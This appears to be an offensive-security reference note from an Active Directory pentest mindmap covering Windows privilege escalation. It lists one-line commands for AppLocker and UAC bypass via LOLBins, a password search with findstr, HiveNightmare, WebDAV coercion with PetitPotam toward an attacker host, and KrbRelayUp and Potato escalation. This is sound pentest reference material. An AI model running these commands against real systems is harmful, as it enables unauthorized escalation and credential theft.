---
title: "Low Access (Privilege Escalation)"
category: privesc
color: "#D0CEE2"
tags:
  - ad-mindmap
  - privesc
  - cve
---

# 🪜 Low Access (Privilege Escalation)

> [!info] Mindmap box `Low access (Privilege escalation)`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Bypass Applocker
➡️ [[Low Access (Privilege Escalation)|Low access (without applocker)]]

- Get-Applocker infos
    - `Get-ChildItem -Path HKLM:\SOFTWARE\Policies \Microsoft\Windows\SrpV2\Exe (dll/msi/...)` [↗](https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.management/get-childitem)
- files in writables paths
    - C:\Windows\Temp
    - C:\Windows\Tasks
- `installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe` [↗](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)
- `mshta.exe my.hta` [↗](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
- `MsBuild.exe pshell.xml` [↗](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)

## UAC bypass
➡️ [[Admin Access|Admin]]

- `Fodhelper.exe`
- `wsreset.exe` [↗](https://lolbas-project.github.io/lolbas/Binaries/Wsreset/)
- `msdt.exe` [↗](https://lolbas-project.github.io/lolbas/Binaries/Msdt/)

## Auto Enum
➡️ [[Admin Access|Admin]]

- `winPEASany_ofs.exe` [↗](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
- `.\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended"`

## Search files
➡️ [[Valid Credentials|User Account]]

- `findstr /si 'pass' *.txt *.xml *.docx *.ini` [↗](https://lolbas-project.github.io/lolbas/Binaries/Findstr/)

## Exploit
➡️ [[Admin Access|Admin]]

- SMBGhost CVE-2020-0796 `#CVE`
- CVE-2021-36934 (HiveNightmare/SeriousSAM) `#CVE`
    - `vssadmin list shadows` [↗](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin)

## Webdav
➡️ [[Man In The Middle|HTTP Coerce]]

- open file <file>.searchConnector-ms
    - `dnstool.py -u <domain>\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>` [↗](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
        - `petitpotam.py -u '<user>' -p <pass> -d '<domain>' "attacker@80/random.txt" <ip>` [↗](https://github.com/topotam/PetitPotam)

## Kerberos Relay
➡️ [[Admin Access|Admin]]

- `KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>` [↗](https://github.com/Dec0ne/KrbRelayUp)
    - `KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name>-cp <omputer_pass>` [↗](https://github.com/Dec0ne/KrbRelayUp)

## From Service account (SEImpersonate)
➡️ [[Admin Access|Admin]]

- RoguePatato `#CVE`
- GodPotato `#CVE`
- PrintSpoofer `#CVE`
- RemotePotato0
